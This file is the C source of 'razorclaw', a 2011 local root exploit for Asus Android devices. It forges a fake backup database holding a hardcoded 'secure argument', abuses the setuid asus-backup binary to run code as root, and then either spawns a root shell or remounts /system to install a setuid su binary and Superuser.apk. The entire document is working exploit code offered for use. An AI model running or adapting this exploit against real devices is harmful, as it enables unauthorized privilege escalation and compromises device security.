/* razorclaw.c - asus local backup root.
 *
 * Copyright (C) 2011 androidroot.mobi
 *
 * Portions copyright (C) 2010-2011 The Android Exploid Crew
 *
 * This file is part of Razorclaw.
 * 
 * Razorclaw is free software; you can redistribute it and/or modify it 
 * under the terms of the GNU General Public License v2 as published by the 
 * Free Software Foundation.
 *
 * Razorclaw is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY 
 * or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for 
 * more details.

 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 
 * 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA
 */
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/mount.h>
#include <sys/stat.h>

#include "sqlite3.h"

#include "superuser/apk.h"
#include "superuser/su.h"

#define DB_DIR     "data/data/com.asus.backuprestore/databases/"
#define DB_FILE    "MyBackup.db"
#define SECURE_ARG "ohlookhowsecurethisis"

#define DO_ROOT_SHIFT 3
#define DO_ROOT_OK (0<<DO_ROOT_SHIFT)
#define DO_ROOT_FAIL_MOUNT (1<<DO_ROOT_SHIFT)
#define DO_ROOT_FAIL_SU (2<<DO_ROOT_SHIFT)
#define DO_ROOT_FAIL_SU_SUID (3<<DO_ROOT_SHIFT)
#define DO_ROOT_FAIL_APK (4<<DO_ROOT_SHIFT)

static int remount(const char *mntpoint)
{
    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

    if ((f = fopen("/proc/mounts", "r")) == NULL)
        return -1;

    memset(buf, 0, sizeof(buf));
    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;
        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }
    fclose(f);
    if (!found)
        return -1;
    if ((dev = strtok(buf, " \t")) == NULL)
        return -1;
    if (strtok(NULL, " \t") == NULL)
        return -1;
    if ((fstype = strtok(NULL, " \t")) == NULL)
        return -1;
    return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
}

static int mkdir_recursive(const char *path)
{
    char opath[256];
    char *p;
    size_t len;

    strncpy(opath, path, sizeof(opath));
    len = strlen(opath);
    if(opath[len - 1] == '/')
            opath[len - 1] = '\0';
    for(p = opath; *p; p++)
            if(*p == '/') {
                    *p = '\0';
                    if(access(opath, F_OK))
                            mkdir(opath, S_IRWXU);
                    *p = '/';
            }
    if(access(opath, F_OK))         /* if path is not terminated with / */
            mkdir(opath, S_IRWXU);

   return !access(path, F_OK);
}

static int create_database()
{
    int rc;
    char sqldb[256];
    sqlite3 *db;

    snprintf(sqldb, sizeof(sqldb), "%s%s", DB_DIR, DB_FILE);
    rc = sqlite3_open(sqldb, &db);

    if(rc) {
        printf("[-] could not open database: (%d) %s\n",
               rc, sqlite3_errmsg(db));
        sqlite3_close(db);
        return 0;
    }

    rc = sqlite3_exec(db, sqlite3_mprintf(
        "DROP TABLE IF EXISTS secure; "
        "CREATE TABLE secure (key VARCHAR(100), value VARCHAR(100)); "
        "INSERT INTO secure (key, value) VALUES ('secure_argument', '%q')",
    SECURE_ARG), 0, 0, 0);

    if(SQLITE_OK != rc) {
        printf("[-] could not populate database: (%d) %s\n",
               rc, sqlite3_errmsg(db));
        sqlite3_close(db);
        return 0;
    }

    sqlite3_close(db);
    return 1;
}

static int do_root()
{
    int fd, bytes;

    if(remount("/system")) {
        return DO_ROOT_FAIL_MOUNT;
    }

    fd = creat("/system/xbin/su", 0755);

    if(fd < 0) {
        return DO_ROOT_FAIL_SU;
    }

    bytes = write(fd, su, su_len);
    close(fd);

    if(bytes != su_len) {
        return DO_ROOT_FAIL_SU;
    }

    if(chmod("/system/xbin/su", 06755)) {
        return DO_ROOT_FAIL_SU_SUID;
    }

    fd = creat("/system/app/Superuser.apk", 0644);

    if(fd < 0) {
        return DO_ROOT_FAIL_APK;
    }

    bytes = write(fd, apk, apk_len);
    close(fd);

    if(bytes != apk_len) {
        return DO_ROOT_FAIL_APK;
    }

    return DO_ROOT_OK;
}

int main(int argc, const char **argv)
{
    char path[512];
    char cmd[1024];
    int rc;

    printf("razorclaw - asus backup local root exploit.\n");
    printf("by androidroot.mobi\n");
    printf("-------------------------------------------\n\n");

    if(getuid() == 0) {
        if(argc > 1 && !strcasecmp(argv[1], "--install")) {
            printf("[+] installing SuperUser and su\n");
            return do_root();
        } else {
            printf("[-] already root and nothing to do.\n\n");
            printf("[*] hint: to install SuperUser and su pass the "
                   "--install parameter on the command line.\n");
            return 1;
        }
    }

    readlink("/proc/self/exe", path, sizeof(path));
    path[strrchr(path, '/') - path] = '\0';

    if(chdir(path)) {
        printf("[-] could not chdir into directory: %s\n", path);
        return 2;
    }

    if(!mkdir_recursive(DB_DIR)) {
        printf("[-] could not create directory: %s\n", DB_DIR);
        return 3;
    } else {
        printf("[+] created fake relative path.\n");
    }

    if(!create_database()) {
        printf("[-] failed to create fake database.\n");
        return 4;
    } else {
        printf("[+] created fake database.\n");
    }

    snprintf(cmd, sizeof(cmd),
             "/system/xbin/asus-backup %s %s/%s --install >/dev/null",
             SECURE_ARG, path, strrchr(argv[0], '/') + 1);

    if(argc > 1 && !strcasecmp(argv[1], "--install")) {
        rc = system(cmd);

        switch(rc) {
            case DO_ROOT_OK:
                printf("[!] successfully rooted your device.\n");
            break;
            case DO_ROOT_FAIL_MOUNT:
                printf("[-] failed to remount /system\n");
            break;
            case DO_ROOT_FAIL_SU:
                printf("[-] failed to install su binary\n");
            break;
            case DO_ROOT_FAIL_SU_SUID:
                printf("[-] failed to set su binary suid\n");
            break;
            case DO_ROOT_FAIL_APK:
                printf("[-] failed to install Superuser.apk\n");
            break;
            default:
                printf("[-] unknown error occurred whist "
                       "trying to root device: %d\n", rc);
            break;
        }

    } else {
        printf("[!] spawning your root shell...\n");
        rc = execl("/system/xbin/asus-backup", "/system/xbin/asus-backup",
                   SECURE_ARG, "/system/bin/sh", NULL);
    }

    return rc;
}
